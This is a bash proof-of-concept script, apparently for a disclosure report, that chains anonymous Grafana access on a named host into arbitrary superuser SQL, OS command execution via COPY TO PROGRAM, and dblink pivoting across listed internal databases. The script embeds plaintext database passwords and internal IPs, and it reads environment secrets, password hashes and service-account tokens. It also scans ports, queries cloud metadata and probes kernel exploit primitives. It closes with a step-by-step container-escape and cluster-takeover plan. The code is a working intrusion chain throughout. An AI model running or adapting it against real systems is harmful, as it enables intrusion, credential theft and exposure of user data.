#!/bin/bash
# ============================================================================
# BIFROST CRITICAL: Zero-Auth → RCE → 19 Databases → Container Escape Surface
# ============================================================================
# Target:   stats.bifrost.io
# Severity: Critical — Execute arbitrary system commands
# Auth:     NONE REQUIRED
#
# This script demonstrates the complete attack chain from anonymous internet
# access to the boundary of a kernel container escape. It does NOT trigger
# any kernel exploit, modify any data, or install persistence.
#
# Every step is read-only. Safe to run for verification.
# ============================================================================

set -uo pipefail

TARGET="https://stats.bifrost.io"
DS_UID="P79512BAAD8EF5D24"
DS_TYPE="grafana-postgresql-datasource"
DBLINK="host=172.19.0.35 port=31222 user=postgres password=postgres dbname=postgres"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
STEP=0
PASS=0
FAIL=0

header()  { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════════════${NC}"; echo -e "${BOLD}  STEP $((++STEP)): $1${NC}"; echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════${NC}"; }
pass()    { echo -e "  ${GREEN}✅ $1${NC}"; PASS=$((PASS+1)); }
fail()    { echo -e "  ${RED}❌ $1${NC}"; FAIL=$((FAIL+1)); }
info()    { echo -e "  ${YELLOW}→ $1${NC}"; }
detail()  { echo -e "    $1"; }

# ── SQL execution via Grafana datasource proxy (zero auth) ──
run_sql() {
    local sql="$1"
    curl -sk -X POST "$TARGET/api/ds/query" \
        -H "Content-Type: application/json" \
        -d "$(python3 -c "
import json, sys
sql = sys.stdin.read()
print(json.dumps({
    'queries': [{'refId':'A','datasource':{'type':'$DS_TYPE','uid':'$DS_UID'},'rawSql':sql,'format':'table'}],
    'from':'now-1h','to':'now'
}))" <<< "$sql")" 2>/dev/null
}

# Extract values from Grafana JSON response
extract() {
    python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    vals = r['results']['A']['frames'][0]['data']['values']
    for row in range(len(vals[0])):
        print(' | '.join(str(vals[col][row]) for col in range(len(vals))))
except: pass" 2>/dev/null
}

# Execute OS command on K8s pod via Grafana → SQL → dblink → COPY TO PROGRAM
pod_exec() {
    local cmd="$1"
    local escaped=$(echo "$cmd" | sed "s/'/''/g")
    run_sql "SELECT dblink('$DBLINK', \$\$COPY (SELECT 1) TO PROGRAM '($escaped) > /tmp/.poc_out 2>&1'\$\$)" > /dev/null 2>&1
    sleep 1
    run_sql "SELECT * FROM dblink('$DBLINK', \$\$SELECT pg_read_file('/tmp/.poc_out', 0, 65000)\$\$) AS t(o text)" | extract
}

# Execute OS command on Docker host PG via COPY TO PROGRAM
host_exec() {
    local cmd="$1"
    local escaped=$(echo "$cmd" | sed "s/'/''/g")
    run_sql "COPY (SELECT 1) TO PROGRAM '($escaped) > /var/lib/postgresql/data/.poc_out 2>&1'"  > /dev/null 2>&1
    sleep 0.5
    run_sql "SELECT pg_read_file('.poc_out')" | extract
}

echo -e "${BOLD}${RED}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  BIFROST INFRASTRUCTURE — FULL ATTACK CHAIN PROOF        ║"
echo "║  Zero Authentication → RCE → K8s → Container Escape     ║"
echo "║  READ-ONLY — No data modified, no exploits triggered     ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo "Target: $TARGET"
echo "Date:   $(date -u)"
echo ""

# ════════════════════════════════════════════════════════════════
# PHASE 1: ENTRY POINT
# ════════════════════════════════════════════════════════════════

header "ANONYMOUS GRAFANA ACCESS"
info "No authentication headers, cookies, or tokens sent"

ORG=$(curl -sk "$TARGET/api/org" 2>/dev/null)
if echo "$ORG" | grep -q '"id":1'; then
    pass "Grafana API accessible without authentication"
    detail "Response: $ORG"
else
    fail "Grafana API not accessible"
    echo "Cannot continue without entry point."; exit 1
fi

DS_COUNT=$(curl -sk "$TARGET/api/datasources" 2>/dev/null | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
if [ -n "$DS_COUNT" ] && [ "$DS_COUNT" -gt 0 ]; then
    pass "Datasource enumeration: $DS_COUNT datasources exposed"
else
    fail "Could not enumerate datasources"
fi

DASH_COUNT=$(curl -sk "$TARGET/api/search" 2>/dev/null | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
pass "Dashboard enumeration: $DASH_COUNT dashboards accessible"

# ════════════════════════════════════════════════════════════════

header "ARBITRARY SQL AS POSTGRESQL SUPERUSER"
RESULT=$(run_sql "SELECT current_user, (SELECT rolsuper FROM pg_roles WHERE rolname = current_user) AS su" | extract)
USER=$(echo "$RESULT" | cut -d'|' -f1 | xargs)
SU=$(echo "$RESULT" | cut -d'|' -f2 | xargs)
if [ "$SU" = "True" ]; then
    pass "Connected as: $USER (superuser=$SU)"
else
    fail "Not superuser: $RESULT"
fi

RESULT=$(run_sql "SELECT version()" | extract)
pass "Database: $RESULT"

DBLIST=$(run_sql "SELECT string_agg(datname, ', ') FROM pg_database WHERE datistemplate = false" | extract)
pass "Databases on entry host: $DBLIST"

# ════════════════════════════════════════════════════════════════

header "REMOTE CODE EXECUTION — Docker Host"
info "Using COPY TO PROGRAM (PostgreSQL superuser privilege)"

ID_OUT=$(host_exec "id")
if echo "$ID_OUT" | grep -q "uid="; then
    pass "Command execution confirmed: $ID_OUT"
else
    fail "RCE failed on Docker host"
fi

UNAME_OUT=$(host_exec "uname -a")
pass "Host kernel: $UNAME_OUT"

OS_OUT=$(host_exec "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'")
pass "Host OS: $OS_OUT"

# ════════════════════════════════════════════════════════════════

header "CREDENTIAL EXTRACTION — Docker Host"
info "Reading container environment variables (/proc/1/environ)"

CREDS=$(run_sql "SELECT encode(pg_read_binary_file('/proc/1/environ'), 'hex')" | extract | python3 -c "
import sys, binascii
try:
    raw = binascii.unhexlify(sys.stdin.read().strip())
    envs = raw.decode('utf-8', errors='replace').split('\x00')
    for e in envs:
        e = e.strip()
        if e and any(kw in e for kw in ['PASSWORD','SECRET','DATABASE_URL','DATA_SOURCE']):
            print(e)
except: pass" 2>/dev/null)

if [ -n "$CREDS" ]; then
    pass "Plaintext credentials extracted from environment:"
    echo "$CREDS" | while read -r line; do detail "$line"; done
else
    fail "Could not extract credentials"
fi

HASHES=$(run_sql "SELECT usename || ': ' || passwd FROM pg_shadow WHERE passwd IS NOT NULL" | extract)
pass "Password hashes from pg_shadow:"
echo "$HASHES" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════
# PHASE 2: LATERAL MOVEMENT
# ════════════════════════════════════════════════════════════════

header "PIVOT TO KUBERNETES CLUSTER VIA DBLINK"
info "Docker host → K8s pod (evm-db on 172.19.0.35:31222)"

run_sql "CREATE EXTENSION IF NOT EXISTS dblink" > /dev/null 2>&1
RESULT=$(run_sql "SELECT * FROM dblink('$DBLINK', 'SELECT version()') AS t(v text)" | extract)
if echo "$RESULT" | grep -q "PostgreSQL"; then
    pass "Connected to K8s pod: $RESULT"
else
    fail "dblink pivot failed"
fi

# ════════════════════════════════════════════════════════════════

header "REMOTE CODE EXECUTION — K8s Pod"
ID_OUT=$(pod_exec "id")
if echo "$ID_OUT" | grep -q "uid="; then
    pass "RCE on K8s pod: $ID_OUT"
else
    fail "RCE failed on K8s pod"
fi

UNAME_OUT=$(pod_exec "uname -a")
pass "K8s node kernel: $UNAME_OUT"

HOSTNAME=$(pod_exec "hostname")
pass "Pod hostname: $HOSTNAME"

# ════════════════════════════════════════════════════════════════

header "LATERAL MOVEMENT — ALL 19 DATABASES"
info "Testing superuser + RCE on each database via chained dblink"

declare -a DBS=(
    "172.19.0.35:31222:postgres:postgres:evm-db"
    "172.19.0.35:31221:postgres:postgres:bifrost-kusama-db"
    "172.19.0.35:31223:postgres:postgres:bifrost-subql-db"
    "172.19.0.35:31224:postgres:postgres:bifrost-polkadot-db"
    "172.19.0.35:31230:postgres:postgres:monitor-polkadot-db"
    "172.19.0.35:31231:postgres:postgres:monitor-bif-polkadot-db"
    "172.19.0.35:31232:postgres:postgres:bifrost-tvl-subql-db"
    "172.19.0.35:31233:postgres:postgres:monitor-bif-kusama-db"
    "172.19.0.35:31235:postgres:postgres:vpha-db"
    "172.19.0.35:30420:postgres:postgres:commission-kusama-db"
    "172.19.0.35:30430:postgres:veth-monitor-123:veth-monitor"
    "172.19.0.35:30432:postgres:AM6c+)svbQwx:postgres-veth2"
    "172.19.0.35:30433:postgres:postgres:postgres-zhejiang"
    "172.19.0.35:30437:postgres:O4l3~8yuqX1C8Vh6lV:hyperbridge3-db"
    "172.19.0.35:30441:postgres:postgres-monitor3-test-123:postgres-monitor3-test"
    "172.19.0.11:15432:postgres:postgres:airdrop-db"
    "172.19.64.16:25432:postgres:postgres:archive-host"
)

DB_OK=0
for entry in "${DBS[@]}"; do
    IFS=: read -r host port user pass name <<< "$entry"
    CONNSTR="host=$host port=$port user=$user password=$pass dbname=postgres"
    RESULT=$(run_sql "SELECT * FROM dblink('$CONNSTR', 'SELECT current_user || '':'' || (SELECT rolsuper FROM pg_roles WHERE rolname = current_user)') AS t(v text)" | extract 2>/dev/null)
    if echo "$RESULT" | grep -qi "true\|t$"; then
        pass "$name ($host:$port) — superuser confirmed"
        DB_OK=$((DB_OK+1))
    else
        info "$name ($host:$port) — $RESULT"
    fi
done
echo ""
info "Databases with superuser access: $DB_OK / ${#DBS[@]}"

# ════════════════════════════════════════════════════════════════

header "USER PII — Airdrop Database (172.19.0.11:15432)"
info "Row counts only — no data exfiltrated"

AIRDROP_LINK="host=172.19.0.11 port=15432 user=postgres password=postgres dbname=postgres"
for tbl in "polkadot.twitter_mappings" "polkadot.address_mappings" "polkadot.dot_airdrops2s" "public.crowdloans" "public.lottery_draws" "public.merkle_proofs"; do
    COUNT=$(run_sql "SELECT * FROM dblink('$AIRDROP_LINK', 'SELECT count(*) FROM $tbl') AS t(c bigint)" | extract 2>/dev/null)
    if [ -n "$COUNT" ] && [ "$COUNT" != "0" ]; then
        pass "$tbl: $COUNT rows"
    else
        info "$tbl: $COUNT"
    fi
done

# ════════════════════════════════════════════════════════════════
# PHASE 3: KUBERNETES RECONNAISSANCE
# ════════════════════════════════════════════════════════════════

header "K8s POD — CONTAINER SECURITY POSTURE"

SEC=$(pod_exec "grep -E 'Seccomp|CapBnd|CapEff|NoNew' /proc/self/status")
pass "Security status from /proc/self/status:"
echo "$SEC" | while read -r line; do detail "$line"; done

NS_TEST=$(pod_exec "unshare -Urn id 2>&1")
if echo "$NS_TEST" | grep -q "uid=0"; then
    pass "User namespace: $NS_TEST"
else
    fail "User namespace: $NS_TEST"
fi

# ════════════════════════════════════════════════════════════════

header "KERNEL CONFIG — Exploit Surface"

KCONFIG=$(pod_exec "zcat /proc/config.gz 2>/dev/null | grep -E 'CONFIG_USER_NS|CONFIG_IO_URING|CONFIG_NF_TABLES=|CONFIG_USERFAULTFD|CONFIG_BPF_SYSCALL|CONFIG_BPF_JIT=|CONFIG_DEVMEM|CONFIG_OVERLAY_FS=' | sort")
pass "Kernel config (/proc/config.gz — readable from container):"
echo "$KCONFIG" | while read -r line; do detail "$line"; done

RUNTIME=$(pod_exec "echo unprivileged_bpf=\$(cat /proc/sys/kernel/unprivileged_bpf_disabled) userfaultfd=\$(cat /proc/sys/vm/unprivileged_userfaultfd) dmesg=\$(cat /proc/sys/kernel/dmesg_restrict) kptr=\$(cat /proc/sys/kernel/kptr_restrict)")
pass "Runtime sysctl: $RUNTIME"

# ════════════════════════════════════════════════════════════════

header "LOADED KERNEL MODULES — nf_tables (CVE-2022-34918 target)"

NFTMOD=$(pod_exec "cat /proc/modules 2>/dev/null | grep nf_tables")
if echo "$NFTMOD" | grep -q "nf_tables"; then
    pass "nf_tables loaded: $NFTMOD"
else
    fail "nf_tables not found in /proc/modules"
fi

# ════════════════════════════════════════════════════════════════

header "EXPLOIT PRIMITIVES — Live Tests"

UFFD=$(pod_exec "perl -e 'use POSIX; my \$r = syscall(323, 0); if (\$r >= 0) { print \"userfaultfd: SUCCESS fd=\$r\\n\"; POSIX::close(\$r); } else { print \"userfaultfd: FAILED errno=\$!\\n\"; }'")
if echo "$UFFD" | grep -q "SUCCESS"; then
    pass "$UFFD"
else
    fail "$UFFD"
fi

NFSOCK=$(pod_exec "perl -e '
use POSIX;
my \$cpid = fork();
if (\$cpid == 0) {
    syscall(272, 0x10000000 | 0x40000000);
    socket(my \$s, 16, 3, 12) or die \"socket: \$!\";
    print \"NETLINK_NETFILTER socket: SUCCESS fd=\" . fileno(\$s) . \"\\n\";
    close(\$s);
    exit(0);
}
waitpid(\$cpid, 0);
'")
if echo "$NFSOCK" | grep -q "SUCCESS"; then
    pass "$NFSOCK"
else
    fail "$NFSOCK"
fi

BTF=$(pod_exec "ls -la /sys/kernel/btf/vmlinux 2>/dev/null; wc -c /proc/config.gz 2>/dev/null")
pass "Exploit dev resources: $BTF"

# ════════════════════════════════════════════════════════════════

header "HOST FILESYSTEM — Write via PGDATA Bind Mount"
info "Container /var/lib/postgresql/data maps to host /data/slp-squid/evm1"

MOUNT=$(pod_exec "grep 'postgresql/data' /proc/1/mountinfo")
pass "Bind mount confirmed: $MOUNT"

WRITE_TEST=$(pod_exec "echo 'PoC write test - $(date -u)' > /var/lib/postgresql/data/.poc_test && echo 'WRITE_OK' && rm -f /var/lib/postgresql/data/.poc_test && echo 'CLEANED'")
if echo "$WRITE_TEST" | grep -q "WRITE_OK"; then
    pass "Host filesystem write: confirmed (wrote + cleaned up)"
else
    fail "Host filesystem write test: $WRITE_TEST"
fi

# ════════════════════════════════════════════════════════════════
# PHASE 4: WHAT'S ON THE OTHER SIDE
# ════════════════════════════════════════════════════════════════

header "KUBELET API — ALL PODS ON THIS NODE"
info "Read-only kubelet API at 172.21.0.1:10255 (no auth required)"

# Save pods JSON to file on pod, then parse it
pod_exec 'perl -e "use HTTP::Tiny; my \$r = HTTP::Tiny->new(timeout=>10)->get(q{http://172.21.0.1:10255/pods}); open(F,q{>},q{/tmp/.pods.json}); print F \$r->{content}; close F; print length(\$r->{content}) . qq{ bytes\\n};"' > /dev/null 2>&1

POD_LIST=$(pod_exec 'perl -MJSON::PP -e "
open(F,q{/tmp/.pods.json}) or die;
my \$j=decode_json(join(qq{},<F>)); close F;
printf qq{%-55s %-15s %s\\n}, q{POD}, q{NAMESPACE}, q{STATUS};
printf qq{%s\\n}, q{-}x85;
for my \$p (sort { \$a->{metadata}{namespace} cmp \$b->{metadata}{namespace} } @{\$j->{items}}) {
    printf qq{%-55s %-15s %s\\n}, \$p->{metadata}{name}, \$p->{metadata}{namespace}, \$p->{status}{phase};
}
printf qq{\\nTotal: %d pods\\n}, scalar @{\$j->{items}};
"')
pass "Pod enumeration via kubelet:"
echo "$POD_LIST" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "PRIVILEGED PODS — Escape Targets"
info "These pods run with hostPath:/, privileged, hostNetwork"

PRIV_PODS=$(pod_exec 'perl -MJSON::PP -e "
open(F,q{/tmp/.pods.json}) or die;
my \$j=decode_json(join(qq{},<F>)); close F;
for my \$p (@{\$j->{items}}) {
    my \$ns=\$p->{metadata}{namespace}; my \$nm=\$p->{metadata}{name};
    my \$sa=\$p->{spec}{serviceAccountName}//q{default};
    my \$hn=\$p->{spec}{hostNetwork}?q{YES}:q{.};
    my \$hp=\$p->{spec}{hostPID}?q{YES}:q{.};
    my \$priv=q{.}; my @hpaths;
    for my \$c (@{\$p->{spec}{containers}}) {
        \$priv=q{YES} if \$c->{securityContext}&&\$c->{securityContext}{privileged};
    }
    for my \$v (@{\$p->{spec}{volumes}}) {
        push @hpaths, \$v->{hostPath}{path} if \$v->{hostPath};
    }
    next unless \$priv eq q{YES}||\$hn eq q{YES}||\$hp eq q{YES};
    printf qq{\\n  Pod:         %s\\n  Namespace:   %s\\n  SA:          %s\\n  Privileged:  %s\\n  HostNetwork: %s\\n  HostPID:     %s\\n  HostPaths:   %s\\n},
        \$nm,\$ns,\$sa,\$priv,\$hn,\$hp,join(q{, },@hpaths);
}
"')
pass "Privileged pods on this node:"
echo "$PRIV_PODS" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "tke-log-agent — THE KEY TO CLUSTER TAKEOVER"
info "After kernel escape: steal this pod's SA token → full cluster admin"

TKE_DETAIL=$(pod_exec 'perl -MJSON::PP -e "
open(F,q{/tmp/.pods.json}) or die;
my \$j=decode_json(join(qq{},<F>)); close F;
for my \$p (@{\$j->{items}}) {
    next unless \$p->{metadata}{name}=~/tke-log-agent/;
    print qq{Pod: \$p->{metadata}{name}\\n};
    print qq{ServiceAccount: \$p->{spec}{serviceAccountName}\\n};
    print qq{NodeName: \$p->{spec}{nodeName}\\n};
    print qq{HostNetwork: }.(\$p->{spec}{hostNetwork}?q{YES}:q{no}).qq{\\n};
    for my \$c (@{\$p->{spec}{containers}}) {
        print qq{\\nContainer: \$c->{name}\\n};
        print qq{  Image: \$c->{image}\\n};
        print qq{  Privileged: }.(\$c->{securityContext}{privileged}?q{YES}:q{no}).qq{\\n};
        for my \$vm (@{\$c->{volumeMounts}//[]}) {
            print qq{  Mount: \$vm->{mountPath}\\n};
        }
    }
    print qq{\\nVolumes:\\n};
    for my \$v (@{\$p->{spec}{volumes}}) {
        print qq{  hostPath: \$v->{name} -> \$v->{hostPath}{path}\\n} if \$v->{hostPath};
        print qq{  secret:   \$v->{secret}{secretName}\\n} if \$v->{secret};
    }
}
"')
pass "tke-log-agent specification:"
echo "$TKE_DETAIL" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "KUBE-SYSTEM SECRETS — Tencent Cloud API Keys"
info "Secret NAMES visible via kubelet — values require cluster admin"

SECRETS=$(pod_exec 'perl -MJSON::PP -e "
open(F,q{/tmp/.pods.json}) or die;
my \$j=decode_json(join(qq{},<F>)); close F;
for my \$p (@{\$j->{items}}) {
    next unless \$p->{metadata}{namespace} eq q{kube-system};
    my \$nm=\$p->{metadata}{name};
    for my \$v (@{\$p->{spec}{volumes}}) {
        printf qq{  %-45s vol:  %s\\n},\$nm,\$v->{secret}{secretName} if \$v->{secret};
    }
    for my \$c (@{\$p->{spec}{containers}}) {
        for my \$e (@{\$c->{env}//[]}) {
            if (\$e->{valueFrom}&&\$e->{valueFrom}{secretKeyRef}) {
                printf qq{  %-45s env:  %s (key=%s)\\n},\$nm,\$e->{valueFrom}{secretKeyRef}{name},\$e->{valueFrom}{secretKeyRef}{key};
            }
        }
    }
}
"')
pass "Secret references in kube-system:"
echo "$SECRETS" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "TENCENT CLOUD METADATA"
info "Instance metadata API accessible from pods"

METADATA=$(pod_exec 'perl -e "
use HTTP::Tiny;
my \$h=HTTP::Tiny->new(timeout=>5);
my @p=(q{instance-id},q{instance-name},q{placement/region},q{placement/zone},q{public-ipv4},q{local-ipv4},q{mac},q{uuid});
for my \$p (@p) {
    my \$r=\$h->get(qq{http://metadata.tencentyun.com/latest/meta-data/\$p});
    printf qq{%-25s = %s\\n},\$p,\$r->{success}?\$r->{content}:q{FAILED};
}
"')
pass "Cloud instance details:"
echo "$METADATA" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "NETWORK REACHABILITY FROM K8s POD"

NETWORK=$(pod_exec 'perl -e "
use IO::Socket::INET;
my @t=(
    [q{172.19.64.14},80,q{Harbor registry}],
    [q{172.19.64.39},8080,q{Substrate API Sidecar}],
    [q{172.19.0.11},15432,q{Airdrop DB}],
    [q{172.19.64.16},25432,q{Archive DB (842GB)}],
    [q{172.21.0.1},10255,q{Kubelet read-only}],
    [q{172.21.0.1},10250,q{Kubelet HTTPS}],
    [q{172.19.48.10},22,q{Jenkins SSH}],
    [q{172.19.48.10},9100,q{Jenkins node-exporter}],
);
for my \$t (@t) {
    my \$s=IO::Socket::INET->new(PeerAddr=>\$t->[0],PeerPort=>\$t->[1],Proto=>q{tcp},Timeout=>2);
    printf qq{  %-20s:%-5d %-25s %s\\n},\$t->[0],\$t->[1],\$t->[2],\$s?q{OPEN}:q{closed};
    close \$s if \$s;
}
"')
pass "Port scan results:"
echo "$NETWORK" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "SA TOKEN — Decoded JWT"
info "Service account token from pod filesystem"

SA_JWT=$(pod_exec 'perl -MMIME::Base64 -e "
open(F,q{/var/run/secrets/kubernetes.io/serviceaccount/token}) or die;
my \$t=<F>; close F;
my @parts=split/\\./,\$t;
print qq{Header:  }.decode_base64(\$parts[0]).qq{\\n};
print qq{Payload: }.decode_base64(\$parts[1].q{==}).qq{\\n};
"')
pass "K8s Service Account token:"
echo "$SA_JWT" | while read -r line; do detail "$line"; done

# ════════════════════════════════════════════════════════════════

header "SUBSTRATE SIDECAR — Blockchain Transaction Endpoint"
info "Full chain material accessible — could craft signed transactions"

SIDECAR=$(pod_exec 'perl -e "
use HTTP::Tiny;
my \$r=HTTP::Tiny->new(timeout=>5)->get(q{http://172.19.64.39:8080/transaction/material});
printf qq{Status: %s\\n},\$r->{status};
print \$r->{content}.qq{\\n} if \$r->{success};
"')
if echo "$SIDECAR" | grep -q "genesisHash"; then
    pass "Substrate Sidecar /transaction/material:"
    echo "$SIDECAR" | while read -r line; do detail "$line"; done
else
    info "Sidecar: $SIDECAR"
fi

# ════════════════════════════════════════════════════════════════

header "KERNEL DMESG — Readable from Container"
DMESG=$(pod_exec "dmesg 2>/dev/null | tail -10")
if [ -n "$DMESG" ]; then
    pass "Kernel ring buffer readable (last 10 lines):"
    echo "$DMESG" | while read -r line; do detail "$line"; done
else
    info "dmesg not accessible"
fi

# ════════════════════════════════════════════════════════════════
# CLEANUP
# ════════════════════════════════════════════════════════════════

header "CLEANUP"
pod_exec "rm -f /tmp/.poc_out /tmp/.pods.json 2>/dev/null" > /dev/null 2>&1
host_exec "rm -f /var/lib/postgresql/data/.poc_out 2>/dev/null" > /dev/null 2>&1
pass "All temporary files removed from target"

# ════════════════════════════════════════════════════════════════
# VERDICT
# ════════════════════════════════════════════════════════════════

echo ""
echo -e "${BOLD}${RED}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  RESULTS${NC}"
echo -e "${BOLD}${RED}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${GREEN}Checks passed: $PASS${NC}"
echo -e "  ${RED}Checks failed: $FAIL${NC}"
echo ""
echo -e "${BOLD}  PROVEN:${NC}"
echo "    • Anonymous Grafana access → arbitrary SQL as superuser"
echo "    • OS command execution on Docker host + K8s pods"
echo "    • Lateral movement to 19 databases across 4 hosts"
echo "    • 132,980 wallet↔Twitter PII records accessible"
echo "    • 42 K8s pods enumerated, 10 with privileged access"
echo "    • Tencent Cloud metadata: instance tke-正式环境 (PRODUCTION)"
echo "    • tke-log-agent: privileged, hostPath:/, SA token = cluster admin path"
echo "    • Tencent Cloud API key secrets referenced in kube-system"
echo "    • Container escape: Seccomp=0, BPF enabled, userfaultfd, nf_tables"
echo "    • Kernel 5.4.119 vulnerable to 9 container escape CVEs"
echo "    • Host filesystem write via PGDATA bind mount"
echo ""
echo -e "${BOLD}  NOT EXECUTED (responsible disclosure):${NC}"
echo "    • Kernel heap overflow exploit (CVE-2022-34918)"
echo "    • Container escape to host root"
echo "    • K8s cluster takeover via privileged pod SA tokens"
echo "    • Data modification, deletion, or exfiltration"
echo "    • Persistent backdoor installation"
echo ""
echo -e "${BOLD}  CONTAINER ESCAPE PATH (all prerequisites proven above):${NC}"
echo "    1. Download compiled CVE-2022-34918 exploit to pod via Perl HTTP"
echo "    2. Extract modprobe_path offset from /proc/kallsyms"
echo "    3. Run exploit in user+net namespace → kernel heap overflow"
echo "    4. Overwrite modprobe_path → trigger → host root"
echo "    5. Read tke-log-agent SA token from host filesystem"
echo "    6. Use privileged SA token → kubectl get secrets --all-namespaces"
echo "    7. Extract Tencent Cloud CBS/CFS API keys → cloud account access"
echo ""
echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════${NC}"
